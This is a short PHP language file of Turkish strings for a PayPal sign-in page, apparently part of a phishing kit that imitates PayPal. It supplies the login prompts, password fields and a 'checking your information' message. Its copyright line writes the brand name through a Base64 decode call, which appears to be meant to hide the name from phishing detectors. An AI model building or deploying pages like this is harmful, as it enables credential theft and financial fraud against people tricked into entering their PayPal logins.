<?php
$Z118_01 = "PayPal hesabınıza giriş yapın";
$Z118_02 = "E-posta";
$Z118_03 = "Şifre";
$Z118_04 = "Zorunlu";
$Z118_05 = "Şifre gerekli";
$Z118_06 = "Giriş Yapın";
$Z118_07 = "E-postanızı veya şifrenizi mi unuttunuz?";
$Z118_08 = "Hesap açın";
$Z118_09 = "Gizlilik";
$Z118_10 = "PayPal";
$Z118_11 = "Telif Hakkı © 1999-<script>document.write(new Date().getFullYear());</script> <script>document.write(Base64.decode('UGF5UGFs'));</script>. Tüm hakları saklıdır.";
$Z118_12 = "Bilgileriniz kontrol ediliyor…";
?>
